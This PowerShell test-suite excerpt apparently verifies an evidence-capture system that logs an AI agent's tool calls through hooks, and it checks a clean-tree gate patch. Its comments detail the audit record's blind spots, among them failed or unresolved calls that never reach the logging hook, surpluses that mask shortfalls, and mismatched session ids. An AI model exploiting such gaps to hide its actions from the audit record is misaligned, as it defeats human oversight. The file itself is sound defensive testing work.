$h2eNamesIt  = ($sideText3 -match 'post-hook-not-fired')
$h2eCounts   = ($sideText3 -match "(?m)^transcript_calls:\s*$($h2eAccounted + 1)\s*$") -and
               ($sideText3 -match "(?m)^denied_calls:\s*$h2eDenied\s*$")

# CONTROL: the same intact store against a transcript with NO extra call must stay EMPTY. Without
# it, a member that reported non-empty over anything at all would look identical to this one.
$trPath2 = Join-Path $sandbox 'h2e-transcript-control.jsonl'
Write-Tr -Path $trPath2 -Succeeded $h2eLogged -Denied $h2eDenied -Failed 0
$h2eControlEmpty = ((Get-Sidecar -Path $trPath2) -match '(?m)^capture_gaps:\s*\[\]\s*$')

# =============================================================================================
# A SURPLUS MUST NOT CANCEL A SHORTFALL (V-1 round 4, WP-1).
# =============================================================================================
# The arithmetic was a NET DIFFERENCE between a per-DISPATCH log count and a per-SESSION transcript
# count. An independent reader drove it two ways -- a subagent call the summariser excludes from the
# transcript count by design but whose PostToolUse entry lands in this same store, and two sessions
# sharing one dispatch id -- and BOTH produced `capture_gaps: []` over a call that had disappeared.
#
# Reporting the surplus separately was my first answer and it was not enough: when the surplus and
# the shortfall are the same subtraction, an EXACT cancellation still reads as zero. The categories
# are kept apart now -- failed, succeeded, denied, each paired with what it can be paired with --
# so a surplus in one cannot pay for a deficit in another.
$trPath3 = Join-Path $sandbox 'h2e-transcript-surplus.jsonl'
Write-Tr -Path $trPath3 -Succeeded ($h2eLogged - 1) -Denied $h2eDenied -Failed 0
$h2eSurplus = ((Get-Sidecar -Path $trPath3) -match 'store SURPLUS')
# And with NO session, the two arms describe different populations: report, never net.
$h2eUnscoped = ((Get-Sidecar -Path $trPath2 -NoSession) -match 'WITHOUT a session id')

# THE EXACT-CANCELLATION CASE, WHICH IS THE ONE THAT WAS MEASURED SILENT. One entry in the store the
# transcript does not explain AND one failed call the store never saw: totals equal, delta zero,
# `capture_gaps: []` -- with a vanished call. This row is the refutation itself, run as a member.
$trPath4 = Join-Path $sandbox 'h2e-transcript-cancel.jsonl'
Write-Tr -Path $trPath4 -Succeeded ($h2eLogged - 1) -Denied $h2eDenied -Failed 1
$sideText7 = Get-Sidecar -Path $trPath4
$h2eCancelTotalsEqual = ($sideText7 -match "(?m)^transcript_calls:\s*$h2eAccounted\s*$")
$h2eCancelCaught      = ($sideText7 -notmatch '(?m)^capture_gaps:\s*\[\]\s*$') -and ($sideText7 -match 'post-hook-not-fired')

# THE CATEGORY MY OWN CURE STOPPED READING (V-1 round 5, self-audit). The arithmetic the
# per-category form replaced was `tool_use_total - accounted`, and tool_use_total INCLUDES
# unresolved calls -- so the old net difference reported them and the stronger form did not. This
# row is the regression, driven: store intact, every logged call accounted for, and one call in the
# transcript that never resolved. The CONTROL for it is $trPath2, already asserted empty above.
$trPath6 = Join-Path $sandbox 'h2e-transcript-unresolved.jsonl'
Write-Tr -Path $trPath6 -Succeeded $h2eLogged -Denied $h2eDenied -Failed 0 -Unresolved 1
$sideText9 = Get-Sidecar -Path $trPath6
$h2eUnresolved = ($sideText9 -notmatch '(?m)^capture_gaps:\s*\[\]\s*$') -and ($sideText9 -match 'never resolved')

# Restore the shortfall sidecar so the detail below shows the case the member is named for.
$sideText3 = Get-Sidecar -Path $trPath

$h2eOk = $h2eNonEmpty -and $h2eNamesIt -and $h2eCounts -and $h2eControlEmpty -and $h2eSurplus -and
         $h2eUnscoped -and $h2eCancelTotalsEqual -and $h2eCancelCaught -and $h2eUnresolved
$detail = @"
  A failed call reaches no hook, so it leaves NO log entry -- the store is intact and correct, and
  the only witness is the transcript, which the harness writes outside the capture path.
  store accounts for $h2eAccounted ($h2eLogged logged + $h2eDenied denied), derived from the store itself;
  the transcript records $($h2eAccounted + 1) -- one call the store never saw:
      sidecar non-empty                 : $h2eNonEmpty   (expect True)
      names it post-hook-not-fired      : $h2eNamesIt   (expect True)
      counts re-derivable from the face : $h2eCounts   (expect True -- transcript_calls: $($h2eAccounted + 1), denied_calls: $h2eDenied)
  CONTROL, same intact store, transcript with only the $h2eAccounted accounted-for calls:
      sidecar empty                     : $h2eControlEmpty   (expect True -- or this member would
                                          report a gap over anything and mean nothing)
  THE OTHER DIRECTION, which is what stopped a surplus cancelling a vanished call:
      transcript SHORTER than the store -> reported, not netted : $h2eSurplus   (expect True)
      NO session id -> reported as UNCOMPARABLE, not as clean   : $h2eUnscoped   (expect True)
  AND THE EXACT CANCELLATION, one surplus entry against one vanished failed call:
      the two totals ARE equal, so a net difference sees nothing : $h2eCancelTotalsEqual   (expect True)
      the sidecar reports it anyway                              : $h2eCancelCaught   (expect True)
  AND THE CALL WITH NO OUTCOME AT ALL, which the per-category cure had stopped seeing:
      a tool_use the transcript never resolves -> reported       : $h2eUnresolved   (expect True --
                                                  no result record means no PostToolUse and no log
                                                  entry, so it IS the population H-2 names)
  sidecar body (the shortfall case):
$(($sideText3.TrimEnd() -split "`n" | ForEach-Object { "    $_" }) -join "`n")
"@

Check -Id 'H-2e' -Title 'a call the transcript records but the store never saw makes the sidecar non-empty: a vanished call cannot coexist with an empty sidecar' `
      -Ok $h2eOk -Detail $detail

# =============================================================================================
# H-2f -- THE OWNED LIFECYCLE, WHICH IS THE ONE THAT WAS BROKEN (V-1 round 6, WP-1)
# =============================================================================================
# Every H-2 member above reaches the sidecar writer DIRECTLY, with a transcript path in hand. The
# delivered lifecycle does not. For a runner-owned dispatch the Stop hook is a no-op, so
# `evidence-dispatch-end.ps1` is the only writer, and it learns a transcript path from nothing but
# its stdin payload -- which the runner fills with `{"session_id": ...}` and nothing else. So the
# transcript arm never ran, and the sidecar reported on the CALL COUNTER ALONE: the arm that
# increments INSIDE PostToolUse, which cannot see a call that never got there.
#
# The members did not catch it because every one of them called the writer the way the RUNNER DOES
# NOT. Testing a function directly while the only production caller passes different arguments is
# how a green suite covered an inert cure for three rounds.
#
# So these rows go through `evidence-dispatch-end.ps1` with the runner's ACTUAL payload.
$h2fRows = New-Object System.Collections.Generic.List[string]
$h2fOk = $true
function H2F {
    param([string]$Label, [int]$Succeeded, [int]$Failed, [switch]$NoStream, [string]$Expect)
    if ($NoStream) {
        Remove-Item -LiteralPath $streamPath -Force -ErrorAction SilentlyContinue
    } else {
        $lines = @()
        for ($i = 1; $i -le $Succeeded; $i++) {
            $lines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_use'; id = "f_s$i"; name = 'Bash'; input = @{ command = 'x' } }) } } | ConvertTo-Json -Depth 8 -Compress)
            $lines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_result'; tool_use_id = "f_s$i"; content = 'ok' }) } } | ConvertTo-Json -Depth 8 -Compress)
        }
        $lines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_use'; id = 'f_d1'; name = 'Bash'; input = @{ command = 'x' } }) } } | ConvertTo-Json -Depth 8 -Compress)
        $lines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_result'; tool_use_id = 'f_d1'; is_error = $true; content = 'DENIED by evidence-guard (AM-417): fixture' }) } } | ConvertTo-Json -Depth 8 -Compress)
        for ($i = 1; $i -le $Failed; $i++) {
            $lines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_use'; id = "f_f$i"; name = 'Bash'; input = @{ command = 'x' } }) } } | ConvertTo-Json -Depth 8 -Compress)
            $lines += (@{ type = 'assistant'; message = @{ content = @(@{ type = 'tool_result'; tool_use_id = "f_f$i"; is_error = $true; content = 'exit 1: it failed' }) } } | ConvertTo-Json -Depth 8 -Compress)
        }
        [System.IO.File]::WriteAllLines($streamPath, $lines, (New-Object System.Text.UTF8Encoding($false)))
    }
    # THE RUNNER'S NAMESPACES, NOT JUST ITS CALL SHAPE (V-1 round 7, WP-1).
    #
    # This member already drove the real hook with the real payload shape -- and still missed the
    # defect, because it passed $gapId as the session id AND stamped the store's entries with that
    # same id. In production those are two different namespaces: the runner composes a SYNTHETIC
    # `session-<Dispatch>` to address the store, while PostToolUse stamps entries with the WORKER'S
    # REAL HARNESS session id. The log filter then discarded every entry and a store with nothing
    # missing reported 36, 35 and 13 phantom gaps on three live mirrors.
    #
    # So the fixture makes them DIFFER, the way production does. The production call
    # path is not enough; it must be the production ARGUMENTS, in the production NAMESPACES.
    $harnessSid = '9f3c1d7e-aa20-4b61-9d18-4c7b6e0f2a55'
    $logPathH2f = Join-Path $gapDir 'log.jsonl'
    if (Test-Path -LiteralPath $logPathH2f) {
        $relabelled = @()
        foreach ($ln in [System.IO.File]::ReadAllLines($logPathH2f)) {
            if (-not $ln.Trim()) { continue }
            $o = $null
            try { $o = $ln | ConvertFrom-Json } catch { $relabelled += $ln; continue }
            if ($null -ne $o -and ($o.PSObject.Properties.Name -contains 'session_id')) { $o.session_id = $harnessSid }
            $relabelled += ($o | ConvertTo-Json -Depth 8 -Compress)
        }
        [System.IO.File]::WriteAllLines($logPathH2f, $relabelled, (New-Object System.Text.UTF8Encoding($false)))
    }
    # THE RUNNER'S PAYLOAD, verbatim: the synthetic dispatch-shaped id, and nothing else.
    $null = Invoke-Hook -Script 'evidence-dispatch-end.ps1' -Json (@{ session_id = $gapId } | ConvertTo-Json -Compress)
    $txt = if (Test-Path -LiteralPath $sidecar) { [System.IO.File]::ReadAllText($sidecar) } else { '' }
    $got = if ($txt -match '(?m)^capture_gaps:\s*\[\]\s*$') { 'clean' }
           elseif ($txt -match 'NO SECOND ARM') { 'no-arm' }
           elseif ($txt -match 'post-hook-not-fired') { 'gap' }
           else { 'other' }
    $pass = ($got -eq $Expect)
    if (-not $pass) { $script:h2fOk = $false }
    $script:h2fRows.Add(('      {0,-52} got={1,-8} expect={2,-8} {3}' -f $Label, $got, $Expect, $(if ($pass) { 'ok' } else { 'MISMATCH' })))
}
# CONTROL FIRST: a stream matching the store must still report clean, or every row below is noise.
H2F 'CONTROL: stream matches the store exactly' -Succeeded 3 -Failed 0 -Expect 'clean'
# THE REFUTATION: one failed call, which reaches no hook and leaves no entry.
H2F 'a FAILED call the store never saw'         -Succeeded 3 -Failed 1 -Expect 'gap'
# AND THE BRANCH THAT USED TO BE SILENT: no second arm at all is not a clean capture.
H2F 'no stream and no transcript'               -Succeeded 0 -Failed 0 -NoStream -Expect 'no-arm'
$detail = @"
    Driven through 'evidence-dispatch-end.ps1' with the RUNNER'S OWN PAYLOAD -- a session id and
    nothing else -- because that is the caller the delivered lifecycle uses, and calling the writer
    directly is what let an inert cure look green for three rounds:
$($h2fRows -join "`n")
    The worker's stream is the second arm here: harness-produced content the runner tees, one remove
    further from the source than a transcript, and -- the property that matters -- NOT incremented
    inside PostToolUse, so it can see a call that never reached it.
    The store's entries are stamped with a HARNESS-shaped session id while the payload carries the
    runner's SYNTHETIC ``session-<dispatch>`` -- two namespaces, as in production. The version of this
    member that used one id for both passed while the delivered path reported phantom gaps on every
    owned dispatch.
"@
Check -Id 'H-2f' -Title "the RUNNER-OWNED lifecycle reconciles against the worker's stream, and refuses to call an unreconciled capture clean" `
      -Ok $h2fOk -Detail $detail

Remove-Item Env:\MISSION_DISPATCH_ID -ErrorAction SilentlyContinue

# =============================================================================================
# H-3 -- D9: the clean-tree exemption ships as a PATCH FILE
# =============================================================================================
# WP-1 owns the ARTIFACT; WP-6 S-5 owns the LIVE proof (a smoke-repo `close` with hooks live).
# What is checkable here is that the patch is a well-formed unified diff naming BOTH gates.
#
# =============================================================================================
# SINCE AN EARLIER REVISION: H-3 AND H-3b NO LONGER READ THE LIVE tools/.
# =============================================================================================
# THE DEFECT. Until this session this member asserted that the patch applied EXACTLY against real
# copies of the LIVE tools/mission-lib.ps1 and tools/mission-spec-accept.ps1 -- in either direction
# -- derived its execution tree by reverse-applying against those copies and then forward-applying,
# and compared the derived mission-lib.ps1 byte-for-byte (after an LF collapse) with the live one.
# So EVERY lifecycle edit to either file was a WP-1 regression BY CONSTRUCTION, whatever the edit
# did. It cost two sessions -- an earlier H-3/H-3b regression, and a later one -- and
# the second was measured on the spec-accept cure: that cure alone (its diff 1, to
# tools/mission-spec-accept.ps1) turned WP-1 to 2 of 23 FAILED, H-3 and H-3b, exit 2, the patch
# matching neither direction, and ran this member's execution leg over 0 scratch mission roots,
# because the derivation depended on the reverse leg matching. A member whose subject is a PATCH
# ARTIFACT was judging the state of the repository instead.
# WHAT CHANGED, per coupling:
#   * THE SUBJECT TREE. New-PreImageTree builds every scratch tree from the patch's own recorded
#     PRE-IMAGE -- the exemption-free blobs of tools/, stored beside the patch under
#     tools/evidence-hooks-next/patches/clean-tree-exemption-pre-image/ -- and never copies the
#     live files. New-ToolsCopy is gone.
#   * THE PIN. The fixture is hash-pinned ON THE PATCH FACE (one PIN block per file in the preamble:
#     fixture path, git blob id, LF byte count, LF sha256). $preImagePinned re-measures all four
#     against the fixture in-process on every run and requires the in-process blob id to begin with
#     the pre-image id on that file's own `index` line in the patch body -- so the fixture, the face
#     and the body must all name the same pre-image. The two sha256 H-3b used to print as an
#     OUT-OF-BAND reading are now measured here, every run.
#   * THE DIRECTION. Measure-PatchExactness is FIXED-DIRECTION: against the pre-image the patch must
#     apply FORWARD and must NOT reverse-apply. The either-direction predicate existed only because
#     the subject tree (the live tools/) could legitimately be either side; the fixture cannot.
#   * THE DERIVATION. The execution tree is the fixture plus ONE forward apply. The live-tree
#     comparison ($execMatchesInstalled) is replaced by $execIsDeclaredPost: each derived file's
#     in-process git blob id (LF basis) must begin with the POST-image id on its own `index` line --
#     the tree under execution is proved to be the post-image the patch DECLARES, read off the patch.
#   * H-3b's corrupt, flipped and (new) empty-patch trees are all fixture trees.
#   * THE FIXTURES FOR THE EXECUTION LEG are built UNCONDITIONALLY, before and independent of the
#     derivation, so H-16 can run over the same scratch mission roots when this member's derivation
#     fails -- which is exactly the situation in which the live gates most need judging.
# WHAT STAYS, deliberately: every conjunct over patch TEXT, the 50 execution rows (32 hand-built plus
# the 18-recipe XY sweep), the alphabet partition and the claim map -- now over the fixture-derived
# tree. And ONE LIVE DEPENDENCY REMAINS, said here rather than discovered: the admission READER,
# tools/lam/lam-verify-admission.ps1, is still copied from the live tree beside the derived gate and
# $readerReal still reads it. It is the ENVIRONMENT the post-image runs in, not one of the two files
# the patch changes, so a lifecycle edit to mission-lib.ps1 or mission-spec-accept.ps1 cannot reach
# this member through it; an edit to the reader can.
# WHERE THE LIVE GATES WENT. Subtracting the live read would leave the repository's own gates judged
# by nothing, so H-16 (after H-3b) judges them BY BEHAVIOUR: the live Assert-CleanWorkingTree
# executed in place over these same scratch roots, and the live Assert-CleanGitTree executed from an
# AST extract and classified CURED or OPEN against the spec-accept cure.
# The round narrative below is HISTORY and is kept. Where it speaks of copies of tools/, of either
# direction, of the installed copies or of reverse-then-forward, it describes the mechanism this
# block replaced.
$patchText  = [System.IO.File]::ReadAllText($patchPath)
$namesBoth  = ($patchText -like '*Assert-CleanGitTree*') -and ($patchText -like '*Assert-CleanWorkingTree*')
$isUnified  = ($patchText -match '(?m)^--- ') -and ($patchText -match '(?m)^\+\+\+ ') -and ($patchText -match '(?m)^@@ ')
$namesPat   = $patchText -match 'session-'
$addsLines  = $patchText -match '(?m)^\+[^+]'

# The session anchor ALONE is the defect, not the cure. git collapses a
# wholly-untracked directory to its shallowest path, so on a plane with no tracked content the
# session anchor matches NOTHING and every ceremony stays blocked while the patch looks correct.
# Split on the file headers and check EXACT LITERALS, not regexes-about-regexes. The earlier form
# matched patterns against a patch whose body is itself patterns, and it silently stopped matching
# the moment the patch was regenerated and git reordered the two files -- reporting all four
# prefixes absent when all four were present. A check that cannot survive its subject being
# regenerated is measuring the spelling, not the property.
#
# =============================================================================================
# THE TWO GATES NO LONGER SHARE A MECHANISM, AND THIS MEMBER
# NOW SAYS SO PER GATE INSTEAD OF ASSERTING ONE MECHANISM TWICE.
# =============================================================================================
# WHAT STOOD HERE AND WHY IT HAD TO GO. The assertion was: both COLLAPSED-FORM prefixes present
# for each gate, `'^\.mission/evidence/'` and `'^\.mission/gates/'` for Assert-CleanWorkingTree,
# `'^\?\? \.mission/evidence/'` and `'^\?\? \.mission/gates/'` for Assert-CleanGitTree. For the
# WORK-TREE gate that assertion ENCODED THE VERY DEFECT the work-tree cure removed: those two code
# exemptions matched the PATH ONLY, after the porcelain XY status code had been stripped, so they
# tolerated a MODIFIED or DELETED tracked evidence file exactly as they tolerated an untracked
# store, and they tolerated the whole evidence plane rather than the declared `verify-` prefix;
# being CODE, no mission could narrow them. Regenerating the patch WITHOUT amending this member
# would have re-asserted the broad form and dragged the defect back in through the instrument --
# which is what the operator said in writing when handing this over.
#
# WHAT REPLACES IT FOR THE WORK-TREE GATE, AND WHY THE FIRST REPLACEMENT WAS ITSELF REFUTED.
# The first replacement asserted three positive Contains() conjuncts
# over the hunk's POST-IMAGE plus a NEGATIVE naming the old assertion's own two collapsed-form
# literals. A fresh-context adversarial validator DROVE two defects straight through it. Both are
# reproduced and cured here; the reproduction is the reason this member looks the way it does.
#   REFUTATION -- THE NEGATIVE WAS A BLACKLIST, AND IT BANNED THE WRONG SPELLING. It forbade
#     '^\.mission/evidence/' and '^\.mission/gates/' -- the PATH-ONLY forms, which were correct for
#     the OLD loop because that loop matched $p after the porcelain XY status code had been
#     stripped. The CURED gate matches the WHOLE porcelain line, status code included, so the same
#     exemption written in the cured gate's own idiom is '^\?\? \.mission/evidence/' and
#     '^\?\? \.mission/gates/'. Those were not banned -- and they are the two strings the
#     spec-accept half of this same member REQUIRES, so the member demanded them in one hunk while
#     failing to forbid them in the other, with nothing in the code saying which gate either claim
#     belonged to. DRIVEN at the integrated tip: inserting
#     `$admitted += @('^\?\? \.mission/evidence/', '^\?\? \.mission/gates/')` into BOTH
#     tools/mission-lib.ps1 and the patch's post-image (hunk header bumped +94,174 -> +94,175)
#     reinstated the whole evidence plane and the whole gates plane as an unnarrowable CODE
#     constant -- precisely the defect the work-tree cure removed -- and WP-1 reported all 22 checks
#     passed, EXIT 0, with this member's NEGATIVE printing 'are ABSENT : True' and exactness
#     preserved at fwd 1 / rev 0. The strictly broader `$admitted += '^\?\? \.mission/'` was green
#     too. A blacklist can only forbid the spellings its author happened to think of.
#   REFUTATION -- THE POSITIVE CONJUNCTS RAN OVER PROSE. Get-PatchPostImage keeps every context
#     and added line, and this post-image is 174 lines of which 136 are COMMENT. DRIVEN: commenting
#     out the single judgment line in both the source and the post-image left a gate that reads the
#     mission's declaration and then judges no porcelain line against it at all -- and the
#     'judgment' conjunct still printed True, satisfied by the commented-out line itself. WP-1: all
#     22 checks passed, EXIT 0.
#
# SO THE WORK-TREE HALF IS NOW WHITELIST-SHAPED, AND IT READS CODE ONLY. Get-Ps1CodeLines strips
# whole-line and inline comments quote-awarely; every work-tree conjunct below reads its output and
# none reads the raw post-image. Two of the conjuncts are CLOSED LISTS -- they enumerate what the
# judging path is ALLOWED to contain and go red on anything else, in any spelling, including
# spellings nobody here has thought of:
#   SINGLE SOURCE -- every code line that ASSIGNS TO or APPENDS TO the declaration pipeline
#     ($porc, $lines, $decl, $admitted, or any property of one of them) must be one of FOUR
#     enumerated lines, and those four read the mission's declaration and nothing else. A
#     code-resident top-up has to write to one of those names, so `+=` in any spelling, a widened
#     right-hand side on the one assignment, and a top-up of $decl.regexes BEFORE it is read all
#     land here. This is the conjunct that binds "the set came from the declaration" rather than
#     "the set does not contain these two strings".
#   CLOSED TEST SURFACE -- every code line carrying a comparison operator (-match / -like /
#     -contains / -in / -eq / ... , .StartsWith( / .Contains( / .IndexOf( , switch) must be one of
#     SIX enumerated lines. This is what reaches a defect that never touches $admitted at all: a
#     second, independent judgment of the porcelain line against a code-resident pattern is a
#     SEVENTH test site, red on sight.
#   Plus, per gate and scoped to its own hunk, a FORBIDDEN SUBSTRING: no code line of the
#     mission-lib hunk may contain '.mission' at all. That is strictly broader than the refuted
#     negative, which banned two spellings of it, and it is declared on the gate row it belongs to
#     rather than floating free.
#   And a CONTROL ON THE STRIPPER: the code-line count must be strictly less than the post-image
#     line count for BOTH hunks, so a stripper that silently returned everything is visible rather
#     than quietly re-admitting prose to satisfy claims about code.
#
# WHAT THIS DOES NOT REACH, STATED RATHER THAN OVERCLAIMED. It is a check on PATCH TEXT, not an
# execution of the gate. It cannot tell a correct regex from an incorrect one; it cannot tell
# whether Get-LamDeclaredAdmittedPorcelain returns what the mission meant; and it cannot see a
# code-resident set smuggled into THAT library, which is a different file set -- $readerReal
# asserts only that the reader is defined in tools/lam/lam-verify-admission.ps1 and that the file
# reads admitted_porcelain. It does not reach a defect that reuses an enumerated line verbatim and
# changes behaviour somewhere the post-image only calls into. It does not parse PowerShell block
# comments, so $noBlockComment asserts there are none in either post-image and the member goes red
# if one appears. And it is deliberately BRITTLE in one direction: any future edit to the judging
# path, benign or not, goes red until the two closed lists here are updated by hand. That is the
# intended price. This is the code that decides what an A-126 gate tolerates, and a silent edit to
# it is exactly what the work-tree defect turned out to be.
#
# WHAT DOES NOT CHANGE FOR THE SPEC-ACCEPT GATE, AND IT IS DELIBERATE THAT IT DOES NOT.
# tools/mission-spec-accept.ps1 was NOT cured: it lay outside the work-tree cure's declared file set and it
# lies outside this session's too. Assert-CleanGitTree therefore still carries the D9
# collapsed forms, and the two gates now genuinely DIVERGE. That divergence is registered
# as an open residual ("what is not claimed", item 4). Its two code literals are kept and still
# expected TRUE -- dropping them would have hidden a real residual behind a member that looked
# symmetric. What makes that safe now is that the per-gate expectations are a TABLE: each literal
# is declared on the row of the gate it belongs to and is only ever tested against that gate's own
# post-image, so one gate's requirement can no longer read as the other gate's permission.
$gitTreeHunk = ''
$workTreeHunk = ''
# Select on the section's OWN diff header line, not on the section text. The patch's prose preamble
# names both files, so a whole-section -like put the preamble in $gitTreeHunk until the real
# spec-accept section happened to overwrite it -- correct only by ordering luck.
foreach ($sec in ($patchText -split '(?m)^diff --git ')) {
    $secHead = ($sec -split "`r?`n")[0]
    if ($secHead -like '*mission-spec-accept.ps1*') { $gitTreeHunk  = $sec }
    elseif ($secHead -like '*mission-lib.ps1*')     { $workTreeHunk = $sec }
}
function Get-PatchPostImage {
    # POST-IMAGE: what the file READS once the patch has applied -- context lines and added lines
    # with the one-character diff marker stripped; removed lines and every header dropped. The
    # '+++ ' header is excluded BEFORE the '+' branch or it would contribute a phantom line of
    # source. Returned LF-joined so a Contains() over it is EOL-independent.
    param([string]$Section)
    $out = @()
    foreach ($ln in ($Section -split "`r?`n")) {
        if ($ln -like 'index *' -or $ln -like '--- *' -or $ln -like '+++ *' -or $ln -like '@@*') { continue }
        if ($ln.Length -lt 1) { continue }
        $c = $ln.Substring(0,1)
        if ($c -eq '+' -or $c -eq ' ') { $out += $ln.Substring(1) }
    }
    ($out -join "`n")
}
function Get-Ps1CodeLines {
    # CODE ONLY. Drops whole-line comments and the trailing part of an inline one, tracking single
    # quotes, double quotes and the backtick escape inside double quotes, so a '#' that lives in a
    # string literal is not mistaken for a comment. Returns TRIMMED lines with their interior
    # spacing intact -- a Contains() over the joined text stays exact -- and the callers collapse
    # whitespace themselves, but only when they compare LISTS. Blank lines are dropped.
    # It does NOT parse PowerShell block comments; the member asserts separately that neither
    # post-image contains one.
    param([string]$Text)
    $out = @()
    foreach ($ln in ($Text -split "`n")) {
        $sb = New-Object System.Text.StringBuilder
        $inS = $false
        $inD = $false
        $i = 0
        while ($i -lt $ln.Length) {
            $ch = $ln[$i]
            if ($inD -and $ch -eq '`') {
                [void]$sb.Append($ch); $i++
                if ($i -lt $ln.Length) { [void]$sb.Append($ln[$i]); $i++ }
                continue
            }
            if ($ch -eq "'" -and (-not $inD)) { $inS = -not $inS; [void]$sb.Append($ch); $i++; continue }
            if ($ch -eq '"' -and (-not $inS)) { $inD = -not $inD; [void]$sb.Append($ch); $i++; continue }
            if ($ch -eq '#' -and (-not $inS) -and (-not $inD)) { break }
            [void]$sb.Append($ch); $i++
        }
        $code = $sb.ToString().Trim()
        if ($code.Length -gt 0) { $out += $code }
    }
    return , $out
}
$workTreePost = Get-PatchPostImage -Section $workTreeHunk
$gitTreePost  = Get-PatchPostImage -Section $gitTreeHunk

# `return , $out` survives assignment, but @(Get-Ps1CodeLines ...) would double-wrap it: assign
# first, normalise second.
$wtCodeArr = Get-Ps1CodeLines -Text $workTreePost
$wtCodeArr = @($wtCodeArr)
$gtCodeArr = Get-Ps1CodeLines -Text $gitTreePost
$gtCodeArr = @($gtCodeArr)
$wtCode = ($wtCodeArr -join "`n")
$gtCode = ($gtCodeArr -join "`n")
$wtPostCount = @($workTreePost -split "`n").Count
$gtPostCount = @($gitTreePost  -split "`n").Count
# CONTROL ON THE STRIPPER. If it silently returned everything, every "over code only" claim below
# would be a claim about the raw text again -- which is the prose refutation, back. Both post-images are
# majority comment, so both must lose lines.
$stripWorks = ($wtCodeArr.Count -gt 0) -and ($wtCodeArr.Count -lt $wtPostCount) -and
              ($gtCodeArr.Count -gt 0) -and ($gtCodeArr.Count -lt $gtPostCount)
$noBlockComment = (-not $workTreePost.Contains('<#')) -and (-not $gitTreePost.Contains('<#'))
$hunksDistinct  = ($workTreeHunk.Length -gt 0) -and ($gitTreeHunk.Length -gt 0) -and
                  ($workTreeHunk -cne $gitTreeHunk)

$admLibSrc  = Join-Path $repoRoot 'tools\lam\lam-verify-admission.ps1'
$admLibText = if (Test-Path -LiteralPath $admLibSrc) { [System.IO.File]::ReadAllText($admLibSrc) } else { '' }

# --- the three positive mechanism conjuncts, now over CODE LINES ONLY ---
$wtReader      = $wtCode.Contains('lam\lam-verify-admission.ps1') -and
                 $wtCode.Contains('Get-LamDeclaredAdmittedPorcelain -MissionRoot $Root')
$wtJudges      = $wtCode.Contains('$admitted = @($decl.regexes)') -and
                 $wtCode.Contains('$admitted | Where-Object { $line -match $_ }')
$wtFailsClosed = $wtCode.Contains('if ($decl.error) { Stop-WithError') -and
                 $wtCode.Contains('if (-not $porc.ok) {')
$readerReal    = $admLibText.Contains('function Get-LamDeclaredAdmittedPorcelain') -and
                 $admLibText.Contains('.mission\mission.yaml') -and
                 $admLibText.Contains('admitted_porcelain')

# --- CLOSED LIST 1: SINGLE SOURCE. Nothing assigns to or appends to the admitted collection, or to
# anything it is derived from, outside these four declaration reads. Compared element-wise and
# case-sensitively against the enumeration; a fifth write site, a changed right-hand side or a
# dropped read are each red.
$wtNorm      = @($wtCodeArr | ForEach-Object { ($_ -replace '\s+', ' ') })
$writeSiteRe = '\$(porc|decl|lines|admitted)(\.[A-Za-z_]\w*)*\s*(\+?=)'
$wtWrites    = @($wtNorm | Where-Object { $_ -match $writeSiteRe })
$wtWritesExpect = @(
    '$porc = Get-LamPorcelainState -MissionRoot $Root'
    '$lines = @($porc.lines)'
    '$decl = Get-LamDeclaredAdmittedPorcelain -MissionRoot $Root'
    '$admitted = @($decl.regexes)'
)
$wtSingleSource = ($wtWrites.Count -eq $wtWritesExpect.Count)
if ($wtSingleSource) {
    for ($k = 0; $k -lt $wtWrites.Count; $k++) {
        if ($wtWrites[$k] -cne $wtWritesExpect[$k]) { $wtSingleSource = $false }
    }
}

# --- CLOSED LIST 2: CLOSED TEST SURFACE. The complete set of comparisons this gate performs,
# enumerated. A porcelain line is tested against exactly one thing -- the declaration-derived
# $admitted -- and a defect that adds its own test, even one that never names $admitted, shows up
# here as an extra row.
$testSiteRe = '(-(c|i)?(match|notmatch|like|notlike|contains|notcontains|in|notin|eq|ne|lt|le|gt|ge)\b)|\.StartsWith\(|\.EndsWith\(|\.Contains\(|\.IndexOf\(|(^|\s)switch\s*[\(\-]'
$wtTests    = @($wtNorm | Where-Object { $_ -match $testSiteRe })
$wtTestsExpect = @(
    'if ($lines.Count -eq 0) { Write-Pass "Working tree clean."; return }'
    'if (@($admitted | Where-Object { $line -match $_ }).Count -gt 0) { $tolerated++; continue }'
    'if ($p -match '' -> '') { $p = ($p -split '' -> '')[-1] }'
    'if ($allow -contains $p) { continue }'
    'if ($offending.Count -gt 0) {'
    '$suffix = if ($allow.Count -gt 0) { "; sanctioned input(s): " + ($allow -join '', '') } else { '''' }'
)
$wtClosedTests = ($wtTests.Count -eq $wtTestsExpect.Count)
if ($wtClosedTests) {
    for ($k = 0; $k -lt $wtTests.Count; $k++) {
        if ($wtTests[$k] -cne $wtTestsExpect[$k]) { $wtClosedTests = $false }
    }
}

# --- PER-GATE SCOPING, MADE STRUCTURAL. One row per gate. A row binds a gate NAME to the ONE
# post-image it is scoped to, to the mechanism THAT gate carries, and to its own required and
# forbidden CODE substrings. The evaluation below never consults a row's literal against the other
# row's text, so the work-tree gate can neither be credited with nor excused by a constant that
# belongs to the spec-accept gate -- which is what the refuted member allowed by holding both
# claims as free-floating variables.
$gateRows = @(
    [pscustomobject]@{
        Gate      = 'Assert-CleanWorkingTree'
        File      = 'tools/mission-lib.ps1'
        Mechanism = 'DECLARATION-DRIVEN (cured)'
        Code      = $wtCode
        Required  = @()
        Forbidden = @('.mission')
    }
    [pscustomobject]@{
        Gate      = 'Assert-CleanGitTree'
        File      = 'tools/mission-spec-accept.ps1'
        Mechanism = 'CODE CONSTANT (NOT cured -- registered residual, amendment 36 item 4)'
        Code      = $gtCode
        Required  = @("'^\?\? \.mission/evidence/'", "'^\?\? \.mission/gates/'")
        Forbidden = @()
    }
)
$gateVerdicts = @()
foreach ($row in $gateRows) {
    $missing = @($row.Required  | Where-Object { -not $row.Code.Contains($_) })
    $present = @($row.Forbidden | Where-Object {      $row.Code.Contains($_) })
    $gateVerdicts += [pscustomobject]@{
        Gate      = $row.Gate
        File      = $row.File
        Mechanism = $row.Mechanism
        Ok        = (($missing.Count -eq 0) -and ($present.Count -eq 0))
        Missing   = $missing
        Present   = $present
        ReqCount  = @($row.Required).Count
        ForbCount = @($row.Forbidden).Count
    }
}
$gateScopingOk = (@($gateVerdicts | Where-Object { -not $_.Ok }).Count -eq 0)
